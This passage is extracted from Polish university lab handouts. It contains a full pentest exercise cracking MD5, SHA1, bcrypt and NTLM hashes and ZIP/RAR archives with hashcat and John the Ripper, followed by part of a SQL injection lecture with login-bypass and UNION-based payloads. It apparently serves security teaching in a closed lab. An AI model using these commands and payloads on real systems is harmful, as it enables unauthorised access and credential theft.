                   KRYPTOGRAFIA                                                                                                                                                             PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-20 01:41:34
```

---

## 2. 9p. Kryptografia PENTEST (1)(1).pdf

Liczba stron: 22


### Strona 1 / 22

#### Tekst

```text
                   KRYPTOGRAFIA | PENTEST                                                                                                                                                   PJA.EDU.PL
      Kryptografia

        Pentest
                        KOMPUTEROWYCH                          Zajęcia nr 9
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-20 01:41:35
```

### Strona 2 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                         Połączenie OpenVPN …………………………………..  5

                                ZADANIA
                                                  Wprowadzenie do Hashcat …………………………..  8
                                                      9.1p Hash MD5 ……………………………………………  9
                                                      9.2p Hash SHA1 …………………………………..….….. 10
                                                      9.3p Hash bcrypt …………………………….…………..  11
                                                      9.4p Hash NTLM ………………………..………………..  12
                                                      9.5p Archiwum ZIP ….……………..…………………..  14
                                                      9.6p Archiwum RAR …………………………………….  15


                                                                                                                                                                              2
s32924 2026-06-20 01:41:35
```

### Strona 3 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wstęp
  Student pozna programy Hashcat i John the Ripper, z pomocą których złamie hasła
  zapisane w formie hashy oraz uzyska dostęp do zaszyfrowanych archiwów.


                                                                                                                                                                              3
s32924 2026-06-20 01:41:35
```

### Strona 4 / 22

#### Tekst

```text
                   KRYPTOGRAFIA | PENTEST                                                                                                                                                   PJA.EDU.PL


       Przygotowanie
         środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-20 01:41:35
```

### Strona 5 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN


  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

  sudo openvpn /sciezka/do/pliku.ovpn


                                                                                                                                                                              5
s32924 2026-06-20 01:41:35
```

### Strona 6 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Dodatkowe uwagi


  ➢Wszystkie zadania z tego dokumentu wykonujemy na maszynie Kali.
  ➢Flagi w niektórych zadaniach mają format inny od standardowego!
  ➢Plik do zadania możesz pobrać na swoją maszynę za pomocą komendy:
   scp student@192.168.100.9:/home/student/{nazwapliku} ./
 ➢W używanej wersji systemu słownik rockyou.txt jest już wypakowany. Domyślnie
   na Kali możesz potrzebować zrobić to samodzielnie.


                                                                                                                                                                              6
s32924 2026-06-20 01:41:35
```

### Strona 7 / 22

#### Tekst

```text
                   KRYPTOGRAFIA | PENTEST                                                       KATEDRA                                                                                     PJA.EDU.PL


          Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-20 01:41:35
```

### Strona 8 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wprowadzenie do Hashcat
  Hashcat to zaawansowane narzędzie do odzyskiwania haseł, wykorzystywane
  głównie w  testach  penetracyjnych    i  analizach  bezpieczeństwa.  Działa
  z różnorodnymi formatami skrótów (hashy) i potrafi efektywnie wykorzystać moc
  obliczeniową procesorów graficznych (GPU), znacząco przyspieszając proces
  łamania  haseł.  Dzięki  temu  stanowi  istotne  wsparcie  dla  specjalistów
  ds.  bezpieczeństwa,  którzy  potrzebują  szybkich   i  skalowalnych  rozwiązań.
  Oprogramowanie  jest dostępne na zasadach open  source, co  sprzyja  jego
  nieustannemu  rozwojowi   i  ulepszaniu metod  ataku. Hashcat  wyróżnia  się
  elastycznością  w   dostosowywaniu   parametrów    pracy,   umożliwiając
  użytkownikowi precyzyjne kontrolowanie procesu łamania. Dodatkowo, aktywna
  społeczność oraz regularne  aktualizacje zapewniają, że narzędzie pozostaje
  na bieżąco z nowymi technikami szyfrowania i rosnącymi potrzebami w zakresie
  testów bezpieczeństwa.


                                                                                                                                                                              8
s32924 2026-06-20 01:41:35
```

### Strona 9 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.1p: Hash MD5

 W  katalogu domowym  znajduje  się  plik hash1,  który  zawiera hash MD5.
  Użyj programu hashcat, aby poznać zaszyfrowany ciąg znaków. Użyto ciągu,
  który znajduje w słowniku rockyou.txt.
  hashcat -m 0 hash1 /usr/share/wordlists/rockyou.txt

                                    Hashe MD5 były popularnie stosowane
                                    do  zapisywania  haseł w  bazach
                                        danych. Obecnie odchodzi się od nich,
                                         jednak nadal bywają używane zarówno
                           w     aplikacjach     internetowych,
                                               jak i działających lokalnie.


                                                                                                                                                                              9
s32924 2026-06-20 01:41:35
```

### Strona 10 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.2p: Hash sha1

 W katalogu domowym  znajduje  się  plik hash2,  który zawiera hash SHA1.
  Użyj programu hashcat, aby poznać zaszyfrowany ciąg znaków. Użyto ciągu,
  który znajduje w słowniku rockyou.txt.
  hashcat -m 100 hash2 /usr/share/wordlists/rockyou.txt
                                         Hashe      SHA1      uchodzą
                                               za bezpieczniejsze od MD5  i nadal
                                              są  często  stosowane w  bazach
                                           danych     dużych     serwisów
                                               internetowych   do   zapisywania
                                                 haseł  użytkowników.  Nierzadko
                                            stosowane      jest     podwójne
                                              hashowanie: sha1(sha1(hasło))


                                                                                                                                                                            10
s32924 2026-06-20 01:41:35
```

### Strona 11 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.3p: Hash bcrypt

 W katalogu domowym znajduje  się  plik hash3, który zawiera hash  bcrypt.
  Użyj programu hashcat, aby poznać zaszyfrowany ciąg znaków. Użyto ciągu,
  który znajduje w słowniku rockyou.txt.
  hashcat -m 3200 hash3 /usr/share/wordlists/rockyou.txt
                                              Bcrypt   jest  coraz  popularniejszym
                                      hashem  ze  względu  na  znaczną
                                         poprawę   bezpieczeństwa   poprzez
                                              umożliwienie dodania do szyfrowanego
                                                ciągu znaków tzw. „soli” - dodatkowych
                                           znaków. Jego  obliczenie  jest jednak
                                                  dłuższe, niż w przypadku MD5 i SHA1.
                            W hashu bcrypt występuje znak $, który
                                         może być różnie interpretowany w konsoli.
                                               Uważaj na to.
                                                                                                                                                                            11
s32924 2026-06-20 01:41:35
```

### Strona 12 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.4p: Hash NTLM

 W katalogu domowym  znajduje  się  plik hash4,  który zawiera hash NTLM.
  Użyj programu hashcat, aby poznać zaszyfrowany ciąg znaków. Tym razem użyto
  hasła składającego się z dziewięciu cyfr, które nie znajduje się w słowniku.
  hashcat -m 1000 hash4 -a3 ?d?d?d?d?d?d?d?d?d?d?d

                                 NTLM   to   metoda   hashowania
                                      opracowana     przez     Microsoft
                                                                                     i  stosowana  do   zapisu   haseł
                                        użytkowników w systemach z rodziny
                                 NT (m.in. Windows XP).


                                      Uwaga! Złamanie tego hasła może
                                              zająć kilka minut.
                                                                                                                                                                            12
s32924 2026-06-20 01:41:35
```

### Strona 13 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.4p: Hash NTLM

  Uwaga! Hashcat ma wbudowany mechanizm, który sprawia, że jeśli już kiedyś
  złamał dane hasło, nie będzie próbował ponownie i nie wyświetli wyniku! W takiej
  sytuacji należy dodać na końcu polecenia przełącznik --show. Alternatywnie
  można wyświetlić zawartość pliku .pot (np. za pomocą polecenia cat).


                                                                                                                                                                            13
s32924 2026-06-20 01:41:35
```

### Strona 14 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.5p: Archiwum ZIP

 W katalogu domowym znajduje się plik pkzip.zip, który zawiera plik z flagą.
  Użyjemy programu John the Ripper do złamania hasła. Najpierw musimy jednak
  przygotować plik wejściowy na podstawie naszego archiwum. Hasło do archiwum
  znajduje się w słowniku rockyou.txt.


  zip2john pkzip.zip > hash5
  john --wordlist=/usr/share/wordlists/rockyou.txt hash5
  unzip pkzip.zip


                                                                                                                                                                            14
s32924 2026-06-20 01:41:35
```

### Strona 15 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.5p: Archiwum ZIP


                                                                                                                                                                            15
s32924 2026-06-20 01:41:35
```

### Strona 16 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6p: Archiwum RAR

 W katalogu domowym znajduje się file.rar, który zawiera nieznany plik. Ponownie
  użyjemy programu John the Ripper do złamania hasła. Najpierw musimy jednak
  przygotować plik wejściowy na podstawie naszego archiwum. Hasło do archiwum
  nie znajduje się w słowniku. Wiemy jednak, że składa się z małych liter oraz cyfr
    i ma maksymalnie trzy znaki.
  Użyjemy więc programu crunch, aby stworzyć słownik właśnie takich haseł:
  crunch 1 3 -f /usr/share/crunch/charset.lst lalpha-numeric > new_dict.txt


                                                                                                                                                                            16
s32924 2026-06-20 01:41:35
```

### Strona 17 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6p: Archiwum RAR

  Następnie musimy utworzyć plik wejściowy dla John the Ripper na podstawie
  naszego archiwum, a później uruchomić łamanie hasła z utworzonym słownikiem.
  Uwaga, łamanie hasła może potrwać kilka minut.
 rar2john file.rar > hash6
 john --wordlist=new_dict.txt hash6


                                                                                                                                                                            17
s32924 2026-06-20 01:41:35
```

### Strona 18 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6p: Archiwum RAR

  Spróbujmy wypakować archiwum i wyświetlić zawartość pliku. Czy wyświetla się
  poprawnie?
  unrar x file.rar
  cat file


                                                                                                                                                                            18
s32924 2026-06-20 01:41:35
```

### Strona 19 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6p: Archiwum RAR

  Taki widok świadczy o tym, że możemy mieć do czynienia z plikiem binarnym.
  Uruchamianie nieznanego pliku z zaszyfrowanego archiwum zwykle nie jest
  dobrym pomysłem, jednak tym razem nie jest to wirus. Zobaczmy, co stanie się
  po uruchomieniu.
  ./file


                                                                                                                                                                            19
s32924 2026-06-20 01:41:35
```

### Strona 20 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6p: Archiwum RAR

 Mamy więc już pewność, że jest to binarny plik wykonywalny. W jaki sposób
 możemy poszukać w nim  flagi? Mamy dwie możliwości, jednak obie będą
  wymagały od nas odpowiedniej analizy otrzymanych wyników. Wyszukajmy stringi
  lub otwórzmy plik w odpowiedniej aplikacji:
  strings file lub xxd file
  Znalezienie poprawnej flagi pozostawiamy studentom!


                                                                                                                                                                            20
s32924 2026-06-20 01:41:35
```

### Strona 21 / 22

#### Tekst

```text
                    KRYPTOGRAFIA | PENTEST                                                                POLSKO-JAPOŃSKAPOLSKO-JAPOŃSKA AKADEMIAAKADEMIA TECHNIKTECHNIK KOMPUTEROWYCHKOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
  struktura plików ZIP

  https://ctf-wiki.mahaloz.re/misc/archive/rar/
  struktura plików RAR

  https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-
  nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4
  podstawy uwierzytelniania NTLM

  https://hashcat.net/wiki/doku.php?id=example_hashes
  przełączniki programu Hashcat


                                                                                                                                                                            2121
s32924 2026-06-20 01:41:35
```

### Strona 22 / 22

#### Tekst

```text
                   KRYPTOGRAFIA | PENTEST                                                                                                                                                   PJA.EDU.PL


      Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-20 01:41:35
```

---

## 3. 10. SQL Injection (2)(2).pdf

Liczba stron: 42


### Strona 1 / 42

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION                                                                                                                                                 PJA.EDU.PL
       Podatności
     SQL Injection

                        KOMPUTEROWYCH                         Zajęcia nr 10
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 18:37:37
```

### Strona 2 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści

                                ŚRODOWISKO
                                                          Uruchamianie maszyn ……………………..  4
                                                              Połączenie OpenVPN ……………………….  5

                                      TEORIA
                                                 Czym jest atak SQL Injection?…………..   9
                                                              Manipulacja zapytaniami SQL ………….  10
                                                               Listowanie tabel i kolumn ………………..  12
                                                         Union-Based SQL Injection ..…………….  20
                                                                 Blind SQL Injection ………………………….  26
                                                 SQLMap ………………………………………….  33
                                                            Zapobieganie SQL Injection ……………..  34

                                   ZADANIA
                                                          10.1 SQL Injection 1 ………………….…….  36
                                                          10.2 SQL Injection 2 ……..…………..…….  37
                                                          10.3 SQL Injection 3 ……………...………..  38
                                                          10.4 SQL Injection 4 ……………….……….  39
                                                          10.5 SQL Injection 5 ……….……………….  40


                                                                                                                                                                                                            2
s32924 2026-06-21 18:37:37
```

### Strona 3 / 42

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION                                                                                                                                                 PJA.EDU.PL


       Przygotowanie
         środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:37:37
```

### Strona 4 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij  się, że maszyna WEB  - SQL INJECTION  jest
  włączona.
  Jeżeli coś  się  zepsuje, w każdej  chwili możesz  ją przywrócić do stanu
  początkowego.


                                                                                                                                                                                                            4
s32924 2026-06-21 18:37:37
```

### Strona 5 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN


  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

  sudo openvpn /sciezka/do/pliku.ovpn

  Uwaga!  Wszystkie  zadania  z  tego  dokumentu  wykonujemy  na  maszynie
  ĆWICZENIA.

                                                                                                                                                                                                            5
s32924 2026-06-21 18:37:37
```

### Strona 6 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                                                            6
s32924 2026-06-21 18:37:37
```

### Strona 7 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Legenda
  cat /etc/passwd - komendę należy wykonać na maszynie Kali
  cat /etc/passwd - komendę należy wykonać na maszynie Ćwiczenia
  cat /etc/passwd - komendę należy wykonać na maszynie Pentest


                                                                                                                                                                                                            7
s32924 2026-06-21 18:37:37
```

### Strona 8 / 42

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION                                                                                                                                                 PJA.EDU.PL


            Teoria
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:37:37
```

### Strona 9 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Czym jest atak SQL Injection?

  SQL  Injection  (SQLi)  to  historycznie  jedna  z  najczęstszych  podatności
 w aplikacjach webowych. Choć ostatnio świadomość wśród twórców aplikacji
  webowych jest wyższa i ten błąd spotyka się już nieco rzadziej, to nadal stanowi
  duże zagrożenie, przez co należy do bardzo istotnych podatności. Wykorzystuje
  nieodpowiednie przetwarzanie danych wejściowych przez aplikację, pozwalając na
  manipulację zapytaniami SQL. Atakujący może uzyskać dostęp do danych,
  zmieniać zawartość i strukturę bazy danych, a nawet całkowicie ją usunąć.


                                                                                                                                                                                                            9
s32924 2026-06-21 18:37:37
```

### Strona 10 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Manipulacja Zapytaniami SQL

  Podstawowy  SQL  Injection   jest  jednym  z  najprostszych    i  najczęściej
  wykorzystywanych rodzajów ataków na aplikacje internetowe. Atak ten polega na
  wstrzyknięciu nieautoryzowanego kodu SQL do danych wejściowych aplikacji, co
  zmienia strukturę zapytania SQL  i prowadzi do nieprzewidzianego zachowania
  bazy danych.

 W aplikacjach webowych dane wejściowe od użytkownika są często używane do
  tworzenia dynamicznych zapytań SQL, które komunikują się z bazą danych. Jeśli
  dane te nie są odpowiednio zabezpieczone, złośliwy użytkownik może wprowadzić
  ciąg znaków, który zmodyfikuje logikę zapytania.


                                                                                                                                                                                                           10
s32924 2026-06-21 18:37:37
```

### Strona 11 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Manipulacja Zapytaniami SQL

 Rozważmy przykład aplikacji logowania, która korzysta z następującego zapytania
  SQL w kodzie backendu:

  SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + password + „’;

 W tym przypadku:

  userInput to nazwa użytkownika wprowadzona przez użytkownika.
  password to hasło wprowadzone przez użytkownika.

  Atakujący wprowadza następujące dane:
  username: ' OR '1'='1' --
  password: dowolne


                                                                                                                                                                                                           11
s32924 2026-06-21 18:37:37
```

### Strona 12 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Manipulacja Zapytaniami SQL
  Po podstawieniu danych wejściowych do zapytania SQL, wynikowy kod wygląda
  następująco:

  SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'dowolne’;
  Wyjaśnienie:
   • ' OR '1'='1': Dodanie warunku logicznego, który zawsze zwraca wartość
    TRUE.
   •  --: Komentarz SQL, który ignoruje resztę zapytania (w tym sprawdzanie hasła).

  Zapytanie w rzeczywistości sprawdza jedynie, czy w tabeli users istnieje dowolny
  użytkownik, ponieważ warunek '1'='1' zawsze jest spełniony.

  Rezultat: Atakujący zostaje zalogowany bez potrzeby znajomości prawidłowej
  nazwy użytkownika i hasła.

                                                                                                                                                                                                           12
s32924 2026-06-21 18:37:37
```

### Strona 13 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Manipulacja Zapytaniami SQL

  Podstawowy SQL Injection działa, ponieważ dane wejściowe użytkownika są
  bezpośrednio wstawiane do zapytania SQL bez żadnego przetwarzania czy
  walidacji. Brak odpowiedniego oddzielenia danych od składni SQL pozwala na
  manipulację logiką zapytania.


                                                                                                                                                                                                           13
s32924 2026-06-21 18:37:37
```

### Strona 14 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Listowanie tabel i kolumn
  Po uzyskaniu dostępu do bazy danych za pomocą SQL Injection, atakujący często
  dąży do poznania struktury bazy danych,  czyli listowania dostępnych tabel
    i kolumn. Jest to kluczowy etap ataku, znany jako enumeracja, który pozwala
  zrozumieć  architekturę  bazy  danych   i  umożliwia  wyciągnięcie  wrażliwych
  informacji.


                                                                                                                                                                                                           14
s32924 2026-06-21 18:37:37
```

### Strona 15 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wykorzystanie tabel systemowych w MySQL

  MySQL,  podobnie  jak  inne  systemy  zarządzania  bazami  danych  (DBMS),
  przechowuje metadane o swojej strukturze w specjalnych tabelach systemowych.
 W MySQL są one zorganizowane w schemacie information_schema, który
  zawiera szczegółowe informacje o bazie danych, takich jak:

   • Nazwy tabel,
   • Nazwy kolumn w tabelach,
   • Typy danych kolumn,
   •  Uprawnienia.


                                                                                                                                                                                                           15
s32924 2026-06-21 18:37:37
```

### Strona 16 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Listowanie tabel i kolumn

  Aby wyświetlić listę wszystkich tabel w bazie danych, atakujący może wykonać
  zapytanie do tabeli information_schema.tables:

  SELECT table_name FROM information_schema.tables;

  Wyjaśnienie:
   • information_schema.tables: Zawiera informacje o wszystkich tabelach
   w bazie danych, w tym nazwę tabeli, schemat, typ i silnik tabeli.
   • table_name: Kolumna w tabeli tables, która przechowuje nazwy tabel.


                                            table_name  Przykład wyniku zapytania:
                                                  users

                                                    orders

                                                   products


                                                                                                                                                                                                           16                                               admin_accounts
s32924 2026-06-21 18:37:37
```

### Strona 17 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Filtrowanie wyników zapytania

  Jeśli atakujący zna nazwę schematu (bazy danych), może zawęzić wyszukiwanie
  tabel do konkretnego schematu:

  SELECT table_name
  FROM information_schema.tables
  WHERE table_schema = 'target_database’;

  Dlaczego to ważne?
  Jeśli baza danych zawiera wiele schematów (np. dla różnych aplikacji), filtrowanie
  pozwala skupić się na interesującym celu.


                                                                                                                                                                                                           17
s32924 2026-06-21 18:37:37
```

### Strona 18 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Listowanie kolumn dla konkretnej tabeli

  Po zidentyfikowaniu tabeli (np. users), atakujący może sprawdzić, jakie kolumny są w niej zawarte:

  SELECT column_name
  FROM information_schema.columns
  WHERE table_name = 'users’;

  Wyjaśnienie:
   •  information_schema.columns: Zawiera informacje o wszystkich kolumnach we wszystkich
     tabelach w bazie danych.
   •  column_name: Kolumna w tabeli columns, która przechowuje nazwy kolumn.
   •  WHERE table_name = 'users': Ogranicza wyniki tylko do kolumn z tabeli users.

                                   column_name  Przykład wyniku zapytania:

                                                       id

                                       username

                                        password

                                             email                                                                                                                                18
s32924 2026-06-21 18:37:37
```

### Strona 19 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Listowanie kolumn na podstawie schematu

  Jeśli baza danych zawiera tabele o tej samej nazwie w różnych schematach,
  atakujący może zawęzić wyniki do konkretnego schematu:

  SELECT column_name
  FROM information_schema.columns
  WHERE table_name = 'users'
  AND table_schema = 'target_database';


                                                                                                                                                                                                           19
s32924 2026-06-21 18:37:37
```

### Strona 20 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Union-Based SQL Injection

  Union-Based SQL Injection to technika ataku, która umożliwia atakującemu
  wyciągnięcie dodatkowych danych z bazy poprzez wykorzystanie klauzuli UNION.
  Klauzula ta pozwala na połączenie wyników dwóch (lub więcej) zapytań SQL, co
 w przypadku podatności na SQL Injection daje możliwość pozyskania informacji
  z różnych tabel w bazie danych.

  Mechanizm działania:
  Klauzula UNION w SQL służy do łączenia wyników dwóch zapytań w jedną tabelę
  wynikową. Aby UNION działał poprawnie:
   •  Liczba kolumn w obu zapytaniach musi być taka sama.
   • Typy danych w odpowiadających sobie kolumnach muszą być zgodne.

  Atakujący wykorzystuje te zasady do manipulacji zapytaniami SQL  aplikacji,
  wstawiając dodatkowe zapytania, które zwracają interesujące dane.


                                                                                                                                                                                                           20
s32924 2026-06-21 18:37:37
```

### Strona 21 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Przykład ataku
 Rozważmy aplikację wykonującą następujące zapytanie SQL:
  SELECT name, email FROM users WHERE id = 1;

  Atakujący wprowadza dane wejściowe, które modyfikują  zapytanie, dodając
  klauzulę UNION:
 ' UNION SELECT username, password FROM admins --
  Po podstawieniu danych wejściowych do zapytania SQL, wynikowy kod wygląda
  następująco:

  SELECT name, email FROM users WHERE id = 1
  UNION
  SELECT username, password FROM admins --;


                                                                                                                                                                                                           21
s32924 2026-06-21 18:37:37
```

### Strona 22 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Przykład ataku - wyjaśnienie


   •  Pierwsze zapytanie:
       •  Pobiera dane użytkownika o id = 1 z tabeli users.
       •  Zwraca kolumny name i email.
   •  Klauzula UNION:
       •  Łączy wyniki pierwszego zapytania z wynikami drugiego zapytania.
   •  Drugie zapytanie:
       •  Pobiera dane z tabeli admins, zwracając kolumny username i password.
       •  Wyniki są połączone z wynikami pierwszego zapytania, co pozwala atakującemu uzyskać
        dodatkowe dane.
   • Komentarz --:
       •  Ignoruje resztę oryginalnego zapytania SQL, zapobiegając błędom składniowym.


                                                                                                                                                                                                           22
s32924 2026-06-21 18:37:37
```

### Strona 23 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Przebieg ataku krok po kroku

  1. Wykrycie liczby kolumn

  Atakujący musi najpierw  ustalić liczbę kolumn zwracanych przez oryginalne
  zapytanie. Może to zrobić, próbując różnych wariantów klauzuli UNION:

  ' UNION SELECT NULL --
  ' UNION SELECT NULL, NULL --
  ' UNION SELECT NULL, NULL, NULL -

  Dopiero gdy liczba kolumn w drugim zapytaniu zgadza się z liczbą kolumn
 w pierwszym, zapytanie zostanie wykonane poprawnie.


                                                                                                                                                                                                           23
s32924 2026-06-21 18:37:37
```

### Strona 24 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Przebieg ataku krok po kroku

  2. Dopasowanie typów danych

  Po ustaleniu liczby kolumn atakujący musi upewnić się, że dane w zwracanych
  kolumnach mają odpowiednie  typy  (np.  tekst,  liczby). W tym  celu może
